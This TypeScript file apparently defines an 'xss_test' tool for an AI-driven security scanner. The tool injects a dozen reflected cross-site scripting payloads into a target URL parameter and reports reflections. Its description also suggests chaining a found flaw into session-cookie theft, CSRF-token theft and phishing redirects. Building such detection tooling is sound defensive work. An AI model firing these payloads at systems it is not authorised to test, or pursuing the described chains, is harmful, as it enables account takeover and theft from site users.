/**
 * Tool: xss_test
 *
 * Cross-site scripting detection. Tests for reflected XSS via payload
 * injection and DOM XSS indicators.
 */

import z from "zod"
import { Tool } from "../../tool/tool"
import { testPayloads, type PayloadPosition } from "../scanner/test-payloads"

const DESCRIPTION = `Test for Cross-Site Scripting (XSS) vulnerabilities.
Tests: reflected XSS (payload reflection in response), basic DOM XSS indicators.

Requires: target URL and parameter to test.

CHAIN POTENTIAL: XSS can be chained to:
- Steal session cookies → account takeover
- Steal CSRF tokens → perform authenticated actions
- Redirect users → phishing
- If stored XSS: affects all users who view the page`

const XSS_PAYLOADS = [
  '<script>alert("numasec")</script>',
  '"><script>alert("numasec")</script>',
  "'-alert('numasec')-'",
  "<img src=x onerror=alert('numasec')>",
  '"><img src=x onerror=alert("numasec")>',
  "<svg onload=alert('numasec')>",
  "javascript:alert('numasec')",
  '<body onload=alert("numasec")>',
  "{{constructor.constructor('return this')()}}",
  "${alert('numasec')}",
  '<details open ontoggle=alert("numasec")>',
  '<iframe src="javascript:alert(\'numasec\')">',
]

const XSS_SUCCESS = [
  '<script>alert("numasec")</script>',
  "onerror=alert",
  "onload=alert",
  "ontoggle=alert",
  "javascript:alert",
  'alert("numasec")',
  "alert('numasec')",
]

export const XssTestTool = Tool.define("xss_test", {
  description: DESCRIPTION,
  parameters: z.object({
    url: z.string().describe("Target URL"),
    parameter: z.string().describe("Parameter to test"),
    position: z
      .enum(["query", "body", "header", "cookie"])
      .default("query")
      .describe("Injection position"),
    method: z.enum(["GET", "POST"]).optional().describe("HTTP method"),
    cookies: z.string().optional().describe("Cookie header"),
  }),
  async execute(params, ctx) {
    await ctx.ask({
      permission: "xss_test",
      patterns: [params.url],
      always: ["*"] as string[],
      metadata: { url: params.url, parameter: params.parameter } as Record<string, any>,
    })

    ctx.metadata({ title: `Testing XSS on ${params.parameter}...` })

    const result = await testPayloads({
      url: params.url,
      method: params.method,
      parameter: params.parameter,
      position: params.position as PayloadPosition,
      payloads: XSS_PAYLOADS,
      successIndicators: XSS_SUCCESS,
      failureIndicators: ["&lt;script&gt;", "Content-Security-Policy"],
      cookies: params.cookies,
      concurrency: 3,
    })

    const parts: string[] = []
    if (result.vulnerable) {
      const vulns = result.results.filter((r) => r.vulnerable)
      parts.push(`⚠ XSS VULNERABLE on parameter "${params.parameter}"`)
      parts.push("")
      for (const v of vulns) {
        parts.push(`Payload: ${v.payload}`)
        parts.push(`Evidence: ${v.evidence}`)
        parts.push(`Status: ${v.status} | Time: ${v.elapsed}ms`)
        parts.push("")
      }
    } else {
      parts.push(`No reflected XSS found on "${params.parameter}" (${result.testedCount} payloads tested)`)
      parts.push(`Baseline: ${result.baselineStatus} (${result.baselineLength} bytes)`)
    }

    return {
      title: result.vulnerable ? `⚠ XSS found on ${params.parameter}` : `No XSS on ${params.parameter}`,
      metadata: { vulnerable: result.vulnerable, tested: result.testedCount } as any,
      output: parts.join("\n"),
    }
  },
})
